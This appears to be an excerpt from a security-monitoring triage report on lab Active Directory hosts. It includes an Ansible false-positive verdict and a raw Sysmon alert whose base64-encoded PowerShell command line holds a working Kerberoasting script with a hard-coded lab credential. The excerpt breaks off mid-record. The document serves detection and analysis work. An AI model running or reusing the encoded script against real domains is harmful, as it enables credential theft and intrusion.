$ps.Runspace.SessionStateProxy.GetVariable(\\\"LASTEXITCODE\\\") if ($null -ne $rc) {     Write-AnsibleLog \\\"INFO - got an rc of $rc from $ModuleName exec\\\" \\\"module_wrapper\\\"     $host.SetShouldExit($rc) } if ($ps.HadErrors -or ($PSVersionTable.PSVersion.Major -lt 4 -and $ps.Streams.Error.Count -gt 0)) {     Write-AnsibleLog \\\"WARN - module had errors, outputting error info $ModuleName\\\" \\\"module_wrapper\\\"     if ($null -eq $rc) {         $host.SetShouldExit(1)     }     foreach ($err in $ps.Streams.Error) {         $error_msg = Format-AnsibleException -ErrorRecord $err         Write-AnsibleLog \\\"WARN - error msg for for $($ModuleName):`r`n$error_msg\\\" \\\"module_wrapper\\\"         $host.UI.WriteErrorLine($error_msg)     } }",
+    "ingest_time": 1784280306536,
+    "stream": "winlogbeat-*",
+    "message_total": "1",
+    "event_code": "4104",
+    "arrival_ms": 1784280146350,
+    "sensor": "Microsoft-Windows-PowerShell/Operational",
+    "raw_ref": "soc-hids-alert-2026.07.17:tSxib58B3gPM8FAeagJ2",
+    "source": "winlogbeat",
+    "event_time": "2026-07-17T09:22:25.568057100Z",
+    "event_uid": "335331e6d37907cf65ec11ede7f71431a22fa9fd966f70fdb2fd06ce31666634"
+  },
+  "subject": null,
+  "related": [
+    {
+      "node": {
+        "_labels": [
+          "Host"
+        ],
+        "hostname": "winterfell.north.sevenkingdoms.local",
+        "role": "domain_controller",
+        "first_seen": "2026-07-02T02:32:07.265Z",
+        "has_adcs": false,
+        "last_seen": "2026-07-22T03:40:03.222383500Z",
+        "domain": "north.sevenkingdoms.local",
+        "criticality": "critical",
+        "is_dc": true
+      },
+      "rel": "ON_HOST"
+    }
+  ]
+}
+
+### ③ 研判   [skill] suspicious_process   [模式] recipe
+# 研判留痕(7 步)
+[1] recipe取证「触发事件」→ 1 行
+[2] recipe取证「主语进程」→ 1 行
+[3] recipe取证「落地文件」→ 0 行
+[4] recipe取证「子进程(含命令行)」→ 0 行
+[5] recipe取证「主机」→ 1 行
+[6] recipe取证「供给/自检噪声」→ 1 行
+[7] recipe取证「_图盲区」→ 1 行
+
+# 研判结果  alert=a0da2b4b7fa09f1a66819ac0dde2ce39b51139516ce7913b4a5dadf38d6116bb  path=B  skill=suspicious_process
+verdict   : false_positive  (confidence=0.98)
+summary   : Ansible 配管供给脚本 (ansible_exec_wrapper) 触发 PowerShell 脚本执行告警，属于已知良性噪声。
+rationale : 证据明确标注该脚本为 'ansible_exec_wrapper'，属于 Ansible 配置管理工具的供给噪声。脚本内容显示其用于创建 PowerShell pipeline 以执行 Ansible 模块，包含设置变量、环境变量、导入模块及执行逻辑，符合 Ansible 在 Windows 端点执行任务的正常行为。根据研判方法论，命中 'ansible_exec_wrapper' 标签可直接判定为 false_positive。
+evidence  : ['alert_uid: a0da2b4b7fa09f1a66819ac0dde2ce39b51139516ce7913b4a5dadf38d6116bb', 'event_code: 4104', 'script_block_text: 包含 Write-AnsibleLog 及 Ansible 模块执行逻辑', '供给/自检噪声: ansible_exec_wrapper(良性:Ansible 配管供给/运维)']
+agent     : qwen3.5-9b
+处置(建议): 无
+
+============================================================================
+## [6/10] technique=T1059.001   该类共 183 条   uid=bb05ad88f71ffb5e3e367269e938d3b2ccb87b4849cd74c09f1b23a284326b06
+============================================================================
+### ① 原始告警节点(:Alert)
+{
+  "severity": 12,
+  "first_seen": "2026-07-17T09:22:25.818390600Z",
+  "last_seen": "2026-07-17T09:22:25.818390600Z",
+  "raw": "{\"@timestamp\": \"2026-07-17T09:22:27.591Z\", \"rule\": {\"firedtimes\": 7, \"mail\": true, \"groups\": [\"sysmon\", \"sysmon_eid1_detections\", \"windows\"], \"level\": 12, \"description\": \"Powershell.exe spawned a powershell process which executed a base64 encoded command\", \"id\": \"92057\", \"mitre\": {\"tactic\": [\"Execution\"], \"technique\": [\"PowerShell\"], \"id\": [\"T1059.001\"]}}, \"location\": \"EventChannel\", \"id\": \"1784280146.158042850\", \"decoder\": {\"name\": \"windows_eventchannel\"}, \"log_source\": \"wazuh\", \"host\": {\"name\": \"f8e24743dcc1\"}, \"log\": {\"offset\": 87558071, \"file\": {\"path\": \"/logs/wazuh/alerts.json\"}}, \"agent\": {\"ip\": \"x.x.x.11\", \"id\": \"005\", \"name\": \"winterfell\", \"version\": \"7.17.22\", \"hostname\": \"f8e24743dcc1\", \"ephemeral_id\": \"d5d271ec-e831-42dd-9d03-45d8ccd7a05b\", \"type\": \"filebeat\"}, \"data\": {\"win\": {\"system\": {\"eventRecordID\": \"1061047\", \"computer\": \"winterfell.north.sevenkingdoms.local\", \"level\": \"4\", \"systemTime\": \"2026-07-17T09:22:25.818390600Z\", \"message\": \"\\\"Process Create:\\r\\nRuleName: -\\r\\nUtcTime: 2026-07-17 09:22:25.788\\r\\nProcessGuid: {0d573dc4-f451-6a59-1ab4-030000000e00}\\r\\nProcessId: 5024\\r\\nImage: C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\r\\nFileVersion: 10.0.17763.1 (WinBuild.160101.0800)\\r\\nDescription: Windows PowerShell\\r\\nProduct: Microsoft® Windows® Operating System\\r\\nCompany: Microsoft Corporation\\r\\nOriginalFileName: PowerShell.EXE\\r\\nCommandLine: \\\"powershell.exe\\\" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIAAkAEUAcgByAG8AcgBBAGMAdABpAG8AbgBQAHIAZQBmAGUAcgBlAG4AYwBlACAAPQAgACcAUwB0AG8AcAAnAAoAJABzAGkAZwAgAD0AIABAACIACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwAKAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAATgAgAHsACgAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAYQBkAHYAYQBwAGkAMwAyAC4AZABsAGwAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAPQB0AHIAdQBlACkAXQAKACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAATABvAGcAbwBuAFUAcwBlAHIAKABzAHQAcgBpAG4AZwAgAHUALAAgAHMAdAByAGkAbgBnACAAZAAsACAAcwB0AHIAaQBuAGcAIABwACwAIABpAG4AdAAgAGwAdAAsACAAaQBuAHQAIABsAHAALAAgAG8AdQB0ACAASQBuAHQAUAB0AHIAIAB0ACkAOwAKACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBhAGQAdgBhAHAAaQAzADIALgBkAGwAbAAiACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgA9AHQAcgB1AGUAKQBdAAoAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABJAG0AcABlAHIAcwBvAG4AYQB0AGUATABvAGcAZwBlAGQATwBuAFUAcwBlAHIAKABJAG4AdABQAHQAcgAgAHQAKQA7AAoAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGEAZAB2AGEAcABpADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByAD0AdAByAHUAZQApAF0ACgAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAFIAZQB2AGUAcgB0AFQAbwBTAGUAbABmACgAKQA7AAoAfQAKACIAQAAKAEEAZABkAC0AVAB5AHAAZQAgAC0AVAB5AHAAZQBEAGUAZgBpAG4AaQB0AGkAbwBuACAAJABzAGkAZwAKACQAdABvAGsAIAA9ACAAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvAAoAIwAgADkAIAA9ACAATABPAEcATwBOADMAMgBfAEwATwBHAE8ATgBfAE4ARQBXAF8AQwBSAEUARABFAE4AVABJAEEATABTACgAPQAgAHIAdQBuAGEAcwAgAC8AbgBlAHQAbwBuAGwAeQApADsAMwAgAD0AIABMAE8ARwBPAE4AMwAyAF8AUABSAE8AVgBJAEQARQBSAF8AVwBJAE4ATgBUADUAMAAKAGkAZgAgACgALQBuAG8AdAAgAFsATgBdADoAOgBMAG8AZwBvAG4AVQBzAGUAcgAoACcAagBvAG4ALgBzAG4AbwB3ACcALAAnAE4ATwBSAFQASAAnACwAJwBpAGsAbgBvAHcAbgBvAHQAaABpAG4AZwAnACwAOQAsADMALABbAHIAZQBmAF0AJAB0AG8AawApACkAIAB7AAoAIAAgACIATABPAEcATwBOAFUAUwBFAFIAXwBGAEEASQBMAEUARAAgAGUAcgByAD0AJAAoAFsAUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAOgBHAGUAdABMAGEAcwB0AFcAaQBuADMAMgBFAHIAcgBvAHIAKAApACkAIgA7ACAAZQB4AGkAdAAgADEACgB9AAoAWwB2AG8AaQBkAF0AWwBOAF0AOgA6AEkAbQBwAGUAcgBzAG8AbgBhAHQAZQBMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgAoACQAdABvAGsAKQAKAHQAcgB5ACAAewAKACAAIAAkAEUAcgByAG8AcgBBAGMAdABpAG8AbgBQAHIAZQBmAGUAcgBlAG4AYwBlACAAPQAgACcAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAnAAoAIAAgACQAcgBvAG8AdAAgAD0AIAAoAFsAQQBEAFMASQBdACIATABEAEEAUAA6AC8ALwBSAG8AbwB0AEQAUwBFACIAKQAuAGQAZQBmAGEAdQBsAHQATgBhAG0AaQBuAGcAQwBvAG4AdABlAHgAdAAKACAAIAAkAGQAcwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBEAGkAcgBlAGMAdABvAHIAeQBTAGUAcgB2AGkAYwBlAHMALgBEAGkAcgBlAGMAdABvAHIAeQBTAGUAYQByAGMAaABlAHIACgAgACAAJABkAHMALgBTAGUAYQByAGMAaABSAG8AbwB0ACAAPQAgAFsAQQBEAFMASQBdACIATABEAEEAUAA6AC8ALwAkAHIAbwBvAHQAIgAKACAAIAAkAGQAcwAuAFAAYQBnAGUAUwBpAHoAZQAgAD0AIAAyADAAMAAKACAAIAAkAGQAcwAuAEYAaQBsAHQAZQByACAAPQAgACIAKAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcABlAHIAcwBvAG4AKQAoAG8AYgBqAGUAYwB0AEMAbABhAHMAcwA9AHUAcwBlAHIAKQAoAHMAZQByAHYAaQBjAGUAUAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQA9ACoAKQAoACEAKABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQBrAHIAYgB0AGcAdAApACkAKQAiAAoAIAAgACQAbgB1AGwAbAAgAD0AIAAkAGQAcwAuAFAAcgBvAHAAZQByAHQAaQBlAHMAVABvAEwAbwBhAGQALgBBAGQAZAAoACIAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACIAKQAKACAAIAAkAG4AdQBsAGwAIAA9ACAAJABkAHMALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFQAbwBMAG8AYQBkAC4AQQBkAGQAKAAiAHMAZQByAHYAaQBjAGUAcAByAGkAbgBjAGkAcABhAGwAbgBhAG0AZQAiACkACgAgACAAJAByAGUAcwAgAD0AIAAkAGQAcwAuAEYAaQBuAGQAQQBsAGwAKAApAAoAIAAgAEEAZABkAC0AVAB5AHAAZQAgAC0AQQBzAHMAZQBtAGIAbAB5AE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAEkAZABlAG4AdABpAHQAeQBNAG8AZABlAGwACgAgACAAJABvAGsAIAA9ACAAMAA7ACAAJABlAHIAcgAgAD0AIAAwADsAIAAkAGwAaQBuAGUAcwAgAD0AIABAACgAKQAKACAAIABmAG8AcgBlAGEAYwBoACAAKAAkAHIAIABpAG4AIAAkAHIAZQBzACkAIAB7AAoAIAAgACAAIAAkAHMAYQBtACAAPQAgAFsAcwB0AHIAaQBuAGcAXQAkAHIALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAIgBzAGEAbQBhAGMAYwBvAHUAbgB0AG4AYQBtAGUAIgBdAFsAMABdAAoAIAAgACAAIABmAG8AcgBlAGEAYwBoACAAKAAkAHMAcABuACAAaQBuACAAJAByAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACIAcwBlAHIAdgBpAGMAZQBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlACIAXQApACAAewAKACAAIAAgACAAIAAgAHQAcgB5ACAAewAKACAAIAAgACAAIAAgACAAIAAkAG4AdQBsAGwAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBkAGUAbgB0AGkAdAB5AE0AbwBkAGUAbAAuAFQAbwBrAGUAbgBzAC4ASwBlAHIAYgBlAHIAbwBzAFIAZQBxAHUAZQBzAHQAbwByAFMAZQBjAHUAcgBpAHQAeQBUAG8AawBlAG4AIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAKABbAHMAdAByAGkAbgBnAF0AJABzAHAAbgApAAoAIAAgACAAIAAgACAAIAAgACQAbwBrACsAKwA7ACAAIAAkAGwAaQBuAGUAcwAgACsAPQAgACgAIgAgACAAWwBPAEsAXQAgACAAewAwAH0AIAAgAC0APgAgACAAewAxAH0AIgAgAC0AZgAgACQAcwBhAG0ALAAgACQAcwBwAG4AKQAKACAAIAAgACAAIAAgAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAZQByAHIAKwArADsAIAAkAGwAaQBuAGUAcwAgACsAPQAgACgAIgAgACAAWwBFAFIAUgBdACAAewAwAH0AIAAgAC0APgAgACAAewAxAH0AIAAgACgAewAyAH0AKQAiACAALQBmACAAJABzAGEAbQAsACAAJABzAHAAbgAsACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlACkACgAgACAAIAAgACAAIAB9AAoAIAAgACAAIAB9AAoAIAAgAH0ACgAgACAAIgBEAE8ATQBBAEkATgBfAEQATgA9ACQAcgBvAG8AdAAiAAoAIAAgACIAUgBPAEEAUwBUAF8ATwBLAD0AJABvAGsAIAAgAFIATwBBAFMAVABfAEUAUgBSAD0AJABlAHIAcgAgACAAKABuAGUAdABvAG4AbAB5ACAAYQBzACAATgBPAFIAVABIAFwAagBvAG4ALgBzAG4AbwB3ACkAIgAKACAAIAAkAGwAaQBuAGUAcwAKAH0AIABmAGkAbgBhAGwAbAB5ACAAewAKACAAIABbAHYAbwBpAGQAXQBbAE4AXQA6ADoAUgBlAHYAZQByAHQAVABvAFMAZQBsAGYAKAApAAoAfQA=\\r\\nCurrentDirectory: C:\\\\Users\\\\vagrant\\\\\\r\\nUser: NORTH\\\\vagrant\\r\\nLogonGuid: {0d573dc4-f450-6a59-f0b4-073500000000}\\r\\nLogonId: 0x3507B4F0\\r\\nTerminalSessionId: 0\\r\\nIntegrityLevel: High\\r\\nHashes: MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F\\r\\nParentProcessGuid: {0d573dc4-f450-6a59-16b4-030000000e00}\\r\\nParentProcessId: 4720\\r\\nParentImage: C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\r\\nParentCommandLine: \\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand JgBjAGgAYwBwAC4AYwBvAG0AIAA2ADUAMAAwADEAIAA+ACAAJABuAHUAbABsAAoAaQBmACAAKAAkAFAAUwBWAGUAcgBzAGkAbwBuAFQAYQBiAGwAZQAuAFAAUwBWAGUAcgBzAGkAbwBuACAALQBsAHQAIABbAFYAZQByAHMAaQBvAG4AXQAiADMALgAwACIAKQAgAHsACgAnAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQBzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbwByACAAbgBlAHcAZQByACIAfQAnAAoAZQB4AGkAdAAgADEACgB9AAoAJABlAHgAZQBjAF8AdwByAGEAcABwAGUAcgBfAHMAdAByACAAPQAgACQAaQBuAHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcACgAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAgAD0AIAAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAF8AcwB0AHIALgBTAHAAbABpAHQAKABAACgAIgBgADAAYAAwAGAAMABgADAAIgApACwAIAAyACwAIABbAFMAdAByAGkAbgBnAFMAcABsAGkAdABPAHAAdABpAG8AbgBzAF0AOgA6AFIAZQBtAG8AdgBlAEUAbQBwAHQAeQBFAG4AdAByAGkAZQBzACkACgBJAGYAIAAoAC0AbgBvAHQAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAuAEwAZQBuAGcAdABoACAALQBlAHEAIAAyACkAIAB7ACAAdABoAHIAbwB3ACAAIgBpAG4AdgBhAGwAaQBkACAAcABhAHkAbABvAGEAZAAiACAAfQAKAFMAZQB0AC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAagBzAG8AbgBfAHIAYQB3ACAALQBWAGEAbAB1AGUAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADEAXQAKACQAZQB4AGUAYwBfAHcAcgBhAHAAcABlAHIAIAA9ACAAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADAAXQApAAoAJgAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAA==\\r\\nParentUser: NORTH\\\\vagrant\\\"\", \"eventID\": \"1\", \"version\": \"5\", \"task\": \"1\", \"providerName\": \"Microsoft-Windows-Sysmon\", \"keywords\": \"0x8000000000000000\", \"opcode\": \"0\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"providerGuid\": \"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\", \"threadID\": \"2584\", \"processID\": \"144\", \"severityValue\": \"INFORMATION\"}, \"eventdata\": {\"company\": \"Microsoft Corporation\", \"parentProcessId\": \"4720\", \"image\": \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe\", \"logonGuid\": \"{0d573dc4-f450-6a59-f0b4-073500000000}\", \"description\": \"Windows PowerShell\", \"fileVersion\": \"10.0.17763.1 (WinBuild.160101.0800)\", \"parentImage\": \"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe\", \"processId\": \"5024\", \"terminalSessionId\": \"0\", \"integrityLevel\": \"High\", \"parentUser\": \"NORTH\\\\\\\\vagrant\", \"parentCommandLine\": \"\\\\\\\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe\\\\\\\" -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand JgBjAGgAYwBwAC4AYwBvAG0AIAA2ADUAMAAwADEAIAA+ACAAJABuAHUAbABsAAoAaQBmACAAKAAkAFAAUwBWAGUAcgBzAGkAbwBuAFQAYQBiAGwAZQAuAFAAUwBWAGUAcgBzAGkAbwBuACAALQBsAHQAIABbAFYAZQByAHMAaQBvAG4AXQAiADMALgAwACIAKQAgAHsACgAnAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQBzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbwByACAAbgBlAHcAZQByACIAfQAnAAoAZQB4AGkAdAAgADEACgB9AAoAJABlAHgAZQBjAF8AdwByAGEAcABwAGUAcgBfAHMAdAByACAAPQAgACQAaQBuAHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcACgAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAgAD0AIAAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAF8AcwB0AHIALgBTAHAAbABpAHQAKABAACgAIgBgADAAYAAwAGAAMABgADAAIgApACwAIAAyACwAIABbAFMAdAByAGkAbgBnAFMAcABsAGkAdABPAHAAdABpAG8AbgBzAF0AOgA6AFIAZQBtAG8AdgBlAEUAbQBwAHQAeQBFAG4AdAByAGkAZQBzACkACgBJAGYAIAAoAC0AbgBvAHQAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAuAEwAZQBuAGcAdABoACAALQBlAHEAIAAyACkAIAB7ACAAdABoAHIAbwB3ACAAIgBpAG4AdgBhAGwAaQBkACAAcABhAHkAbABvAGEAZAAiACAAfQAKAFMAZQB0AC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAagBzAG8AbgBfAHIAYQB3ACAALQBWAGEAbAB1AGUAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADEAXQAKACQAZQB4AGUAYwBfAHcAcgBhAHAAcABlAHIAIAA9ACAAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADAAXQApAAoAJgAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAA==\", \"processGuid\": \"{0d573dc4-f451-6a59-1ab4-030000000e00}\", \"currentDirectory\": \"C:\\\\\\\\Users\\\\\\\\vagrant\\\\\\\\\", \"user\": \"NORTH\\\\\\\\vagrant\", \"parentProcessGuid\": \"{0d573dc4-f450-6a59-16b4-030000000e00}\", \"product\": \"Microsoft® Windows® Operating System\", \"commandLine\": \"\\\\\\\"powershell.exe\\\\\\\" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIAAkAEUAcgByAG8AcgBBAGMAdABpAG8AbgBQAHIAZQBmAGUAcgBlAG4AYwBlACAAPQAgACcAUwB0AG8AcAAnAAoAJABzAGkAZwAgAD0AIABAACIACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwAKAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAATgAgAHsACgAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAYQBkAHYAYQBwAGkAMwAyAC4AZABsAGwAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAPQB0AHIAdQBlACkAXQAKACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAATABvAGcAbwBuAFUAcwBlAHIAKABzAHQAcgBpAG4AZwAgAHUALAAgAHMAdAByAGkAbgBnACAAZAAsACAAcwB0AHIAaQBuAGcAIABwACwAIABpAG4AdAAgAGwAdAAsACAAaQBuAHQAIABsAHAALAAgAG8AdQB0ACAASQBuAHQAUAB0AHIAIAB0ACkAOwAKACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBhAGQAdgBhAHAAaQAzADIALgBkAGwAbAAiACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgA9AHQAcgB1AGUAKQBdAAoAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABJAG0AcABlAHIAcwBvAG4AYQB0AGUATABvAGcAZwBlAGQATwBuAFUAcwBlAHIAKABJAG4AdABQAHQAcgAgAHQAKQA7AAoAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGEAZAB2AGEAcABpADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByAD0AdAByAHUAZQApAF0ACgAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAFIAZQB2AGUAcgB0AFQAbwBTAGUAbABmACgAKQA7AAoAfQAKACIAQAAKAEEAZABkAC0AVAB5AHAAZQAgAC0AVAB5AHAAZQBEAGUAZgBpAG4AaQB0AGkAbwBuACAAJABzAGkAZwAKACQAdABvAGsAIAA9ACAAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvAAoAIwAgADkAIAA9ACAATABPAEcATwBOADMAMgBfAEwATwBHAE8ATgBfAE4ARQBXAF8AQwBSAEUARABFAE4AVABJAEEATABTACgAPQAgAHIAdQBuAGEAcwAgAC8AbgBlAHQAbwBuAGwAeQApADsAMwAgAD0AIABMAE8ARwBPAE4AMwAyAF8AUABSAE8AVgBJAEQARQBSAF8AVwBJAE4ATgBUADUAMAAKAGkAZgAgACgALQBuAG8AdAAgAFsATgBdADoAOgBMAG8AZwBvAG4AVQBzAGUAcgAoACcAagBvAG4ALgBzAG4AbwB3ACcALAAnAE4ATwBSAFQASAAnACwAJwBpAGsAbgBvAHcAbgBvAHQAaABpAG4AZwAnACwAOQAsADMALABbAHIAZQBmAF0AJAB0AG8AawApACkAIAB7AAoAIAAgACIATABPAEcATwBOAFUAUwBFAFIAXwBGAEEASQBMAEUARAAgAGUAcgByAD0AJAAoAFsAUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAOgBHAGUAdABMAGEAcwB0AFcAaQBuADMAMgBFAHIAcgBvAHIAKAApACkAIgA7ACAAZQB4AGkAdAAgADEACgB9AAoAWwB2AG8AaQBkAF0AWwBOAF0AOgA6AEkAbQBwAGUAcgBzAG8AbgBhAHQAZQBMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgAoACQAdABvAGsAKQAKAHQAcgB5ACAAewAKACAAIAAkAEUAcgByAG8AcgBBAGMAdABpAG8AbgBQAHIAZQBmAGUAcgBlAG4AYwBlACAAPQAgACcAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAnAAoAIAAgACQAcgBvAG8AdAAgAD0AIAAoAFsAQQBEAFMASQBdACIATABEAEEAUAA6AC8ALwBSAG8AbwB0AEQAUwBFACIAKQAuAGQAZQBmAGEAdQBsAHQATgBhAG0AaQBuAGcAQwBvAG4AdABlAHgAdAAKACAAIAAkAGQAcwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBEAGkAcgBlAGMAdABvAHIAeQBTAGUAcgB2AGkAYwBlAHMALgBEAGkAcgBlAGMAdABvAHIAeQBTAGUAYQByAGMAaABlAHIACgAgACAAJABkAHMALgBTAGUAYQByAGMAaABSAG8AbwB0ACAAPQAgAFsAQQBEAFMASQBdACIATABEAEEAUAA6AC8ALwAkAHIAbwBvAHQAIgAKACAAIAAkAGQAcwAuAFAAYQBnAGUAUwBpAHoAZQAgAD0AIAAyADAAMAAKACAAIAAkAGQAcwAuAEYAaQBsAHQAZQByACAAPQAgACIAKAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcABlAHIAcwBvAG4AKQAoAG8AYgBqAGUAYwB0AEMAbABhAHMAcwA9AHUAcwBlAHIAKQAoAHMAZQByAHYAaQBjAGUAUAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQA9ACoAKQAoACEAKABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQBrAHIAYgB0AGcAdAApACkAKQAiAAoAIAAgACQAbgB1AGwAbAAgAD0AIAAkAGQAcwAuAFAAcgBvAHAAZQByAHQAaQBlAHMAVABvAEwAbwBhAGQALgBBAGQAZAAoACIAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACIAKQAKACAAIAAkAG4AdQBsAGwAIAA9ACAAJABkAHMALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFQAbwBMAG8AYQBkAC4AQQBkAGQAKAAiAHMAZQByAHYAaQBjAGUAcAByAGkAbgBjAGkAcABhAGwAbgBhAG0AZQAiACkACgAgACAAJAByAGUAcwAgAD0AIAAkAGQAcwAuAEYAaQBuAGQAQQBsAGwAKAApAAoAIAAgAEEAZABkAC0AVAB5AHAAZQAgAC0AQQBzAHMAZQBtAGIAbAB5AE4AYQBtAGUAIABTAHkA